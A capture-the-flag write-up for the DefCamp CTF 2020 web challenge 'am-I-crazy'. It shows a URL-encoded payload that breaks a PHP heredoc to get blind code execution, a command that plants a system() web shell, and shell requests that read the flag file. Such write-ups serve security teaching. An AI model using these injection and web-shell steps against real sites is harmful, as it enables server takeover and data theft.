# DefCamp CTF 2020 – am-I-crazy

* **Category:** web
* **Points:** ?

## Challenge

> You might see but you cannot feel.
> 
> Flag format: CTF{sha256}
> 
> The challenge was proposed by BIT SENTINEL.
> 
> 35.198.103.37:31239

## Solution

The page will show the following HTML code.

```html
<!DOCTYPE html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>AM-I-CRAZY</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

  </head>

  <body>

    <div class="container">
      

      <div class="jumbotron">
        <h1 class="display-3">AM I CRAZY</h1>
        <p class="lead">Use a random password and the bellow button to generate or restore to the initial state the challenge.
        <form method="POST" action="/">
            <div class="form-group" style=""><label>Password:</label><input pattern=".{8,}" name="password" type="password" class="form-control" style="display: block; position: static; float: none;" required></div></p>
            <p><button type="submit" class="btn btn-lg btn-success" href="#" role="button">Generate</button></p>
        </form>
      </div>


    </div> <!-- /container -->
  

</body>
</html>
```

You have to insert a password with at least 8 chars.

Inserting 8 `a`s will open the following URL `http://35.198.103.37:31239/secrets/64f79ab242648e5c493c6af52ee4469a/index.php` with the following content.

```php
10 <?=
define('WORKING_DIRECTORY', getcwd());

$var = <<<xd
0
xd;

echo $var;

register_shutdown_function(function() {
    chdir(WORKING_DIRECTORY);
    if (empty($_GET['tryharder'])) {
        $_GET['tryharder'] = 0;
        show_source(__FILE__);
    }
    if (strlen($_GET['tryharder']) > 15){
        $_GET['tryharder'] = 0;
    }
    $contents = file_get_contents(__FILE__);
    $search_pattern = '/\$var = <<<xd\s*(.*)\s*xd/im';
    preg_match($search_pattern, $contents, $matches);
    
    $new_contents = preg_replace_callback($search_pattern, function($matches) {
        return str_replace($matches[1], $_GET['tryharder'], $matches[0]);
    }, $contents);
    file_put_contents(__FILE__, $new_contents, LOCK_EX);
}); 
```

After the button press, you are redirected to a page like the following URL: `/secrets/3db406bb8ed1399d75a88f31b9aac730/index.php`

Here you can specify a value for the `tryharder` parameter.

```
GET /secrets/3db406bb8ed1399d75a88f31b9aac730/index.php?tryharder=<your_value_here> HTTP/1.1
Host: 35.242.253.155:30574
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://35.242.253.155:30574/
Upgrade-Insecure-Requests: 1
```

A payload can be the following, in order to use *code injection* to break the *heredoc* and obtain a blind RCE.

```php
xd;
`$_GET[0]`;
```

Payload must be URL-encoded.

```
%78%64%3B%0A%60%24%5F%47%45%54%5B%30%5D%60%3B
```

Sending it, the page will become the following.

```php
1 <?=
define('WORKING_DIRECTORY', getcwd());

$var = <<<xd
xd;
`$_GET[0]`;
xd;

echo $var;

register_shutdown_function(function() {
    chdir(WORKING_DIRECTORY);
    if (empty($_GET['tryharder'])) {
        $_GET['tryharder'] = 0;
        show_source(__FILE__);
    }
    if (strlen($_GET['tryharder']) > 15){
        $_GET['tryharder'] = 0;
    }
    $contents = file_get_contents(__FILE__);
    $search_pattern = '/\$var = <<<xdxd;
`$_GET[0]`;xd/im';
    preg_match($search_pattern, $contents, $matches);
    
    $new_contents = preg_replace_callback($search_pattern, function($matches) {
        return str_replace($matches[1], $_GET['tryharder'], $matches[0]);
    }, $contents);
    file_put_contents(__FILE__, $new_contents, LOCK_EX);
});
```

Using the blind RCE, you can execute a command to create another PHP page with a more useful web shell. For example, the following code can be used.

```php
echo 'Output:<br /><code><?php echo system($_GET[0]);?></code>' > shell.php
```

Payload must be URL-encoded.

```
%65%63%68%6F%20%27%4F%75%74%70%75%74%3A%3C%62%72%20%2F%3E%3C%63%6F%64%65%3E%3C%3F%70%68%70%20%65%63%68%6F%20%73%79%73%74%65%6D%28%24%5F%47%45%54%5B%30%5D%29%3B%3F%3E%3C%2F%63%6F%64%65%3E%27%20%3E%20%73%68%65%6C%6C%2E%70%68%70
```

Now you have a simpler web shell to use that returns the output of executed commands. Commands are passed via GET `0` URL parameter.

With this you can discover where the flag is.

```
http://35.242.253.155:30574/secrets/0641302347967910d65b269202ed912d/shell.php?0=ls%20-al%20../../

Output:
total 56
drwxrwxrwx 1 www-data www-data  4096 Dec  6 12:25 .
drwxr-xr-x 1 root     root      4096 Sep 12  2019 ..
-rw-r--r-- 2 www      www          2 Dec  6 10:57 apache2.pid
-rw-rw-r-- 1 root     root       153 Dec  1 08:31 flag.php
lrwxrwxrwx 1 www      www          6 Dec  6 12:25 html -> l/html
-rw-rw-r-- 1 root     root      2692 Dec  1 08:31 index.php
drwxrwxr-x 1 www      www      24576 Dec  6 19:18 secrets
drwxrwxr-x 1 www      www      24576 Dec  6 19:18 secrets
```

You can copy the flag file in the current directory.

```
http://35.242.253.155:30574/secrets/0641302347967910d65b269202ed912d/shell.php?0=cp%20../../flag.php%20.

http://35.242.253.155:30574/secrets/0641302347967910d65b269202ed912d/shell.php?0=ls%20-al

Output:
total 44
drwxr-xr-x 2 www www  4096 Dec  6 19:35 .
drwxrwxr-x 1 www www 24576 Dec  6 19:18 ..
-rw-r--r-- 1 www www   153 Dec  6 19:35 flag.php
-rw-r--r-- 1 www www   770 Dec  6 19:31 index.php
-rw-r--r-- 1 www www    57 Dec  6 19:31 shell.php
-rw-r--r-- 1 www www    57 Dec  6 19:31 shell.php
```

And print the flag file content.

```
http://35.242.253.155:30574/secrets/0641302347967910d65b269202ed912d/shell.php?0=cat%20flag.php

Output:
<?php

echo "Try harder!";

if (1 == 0) {
    echo "ctf{d067ddd00ba4129e83898758ac321533f392364cfaca7967d66791d9d08823bb}";
}

?>
<!-- Try harder! x2 --><!-- Try harder! x2 -->
```

The flag is the following.

```
CTF{d067ddd00ba4129e83898758ac321533f392364cfaca7967d66791d9d08823bb}
```